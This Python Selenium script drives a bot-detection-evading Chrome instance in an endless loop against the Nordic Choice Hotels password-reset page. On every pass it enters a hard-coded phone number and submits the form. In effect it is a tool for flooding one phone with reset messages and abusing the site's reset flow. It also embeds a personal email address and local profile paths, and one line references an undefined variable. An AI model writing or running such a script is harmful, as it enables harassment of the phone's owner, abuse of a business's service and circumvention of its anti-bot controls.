import undetected_chromedriver.v2 as webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains

count=1
recount=0
import string
import random
import time
letters = string.ascii_lowercase
usernameStr = 'zahidkamal78978@gmail.com'
Str = '78978'
options = webdriver.ChromeOptions()

#options.add_argument(r"--user-data-dir=C:\\Users\\Ahmad\\AppData\\Local\\Google\\Chrome\\User Data")
options.add_argument(r'--profile-directory=C:\\Users\\Ahmad\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 3')
while(1):
 browser = webdriver.Chrome(options=options,use_subprocess=True)
 browser.get(('https://www.nordicchoicehotels.com/nordic-choice-club/reset'))
 #browser.minimize_window() 
 fnumbers=['3317267871','3317267871']

 while(1):
  while (1):
   try:
    while (1):
     try:
      usernasp = WebDriverWait(browser, 5).until(
       EC.presence_of_element_located((By.XPATH, '//label[@class="eds-c-radio light js-reset-pw-email-phone"]')))
      browser.execute_script("arguments[0].click();", usernasp)
      break
     except:
      print("a")
      print(A)

    time.sleep(1)
    usernasp = WebDriverWait(browser, 3).until(
     EC.presence_of_element_located((By.CSS_SELECTOR, '#forgot-PhonePage > div > label.eds-c-select > select')))
    usernasp.click()
    time.sleep(2)
    usernasp = WebDriverWait(browser, 3).until(
     EC.presence_of_element_located(
      (By.CSS_SELECTOR, '#forgot-PhonePage > div > label.eds-c-select > select > option:nth-child(162)')))
    usernasp.click()
    usernasp = WebDriverWait(browser, 3).until(
     EC.presence_of_element_located(
      (By.CSS_SELECTOR, '#forgot-PhonePage > div > label.eds-c-input > input[type=tel]')))
    usernasp.send_keys(fnumbers[recount])
    time.sleep(1)
    usernasp = WebDriverWait(browser, 3).until(
     EC.presence_of_element_located(
      (By.CSS_SELECTOR, '#forgot-PhonePage > button')))
    usernasp.click()
    usernasp = WebDriverWait(browser, 5).until(
     EC.presence_of_element_located((By.CSS_SELECTOR,
                                     '#forgot-EmailPage > label > input[type=email]')))

    time.sleep(2)


   except:

    browser.refresh()
    break

   count = count + 1
   print(count)
   if(count%10==0):
    browser.get("https://www.nordicchoicehotels.com/")
    time.sleep(2)
    browser.get("https://www.nordicchoicehotels.com/nordic-choice-club/reset")
   if (recount < (len(fnumbers) - 1)):

    recount += 1
   else:

    recount = 0


  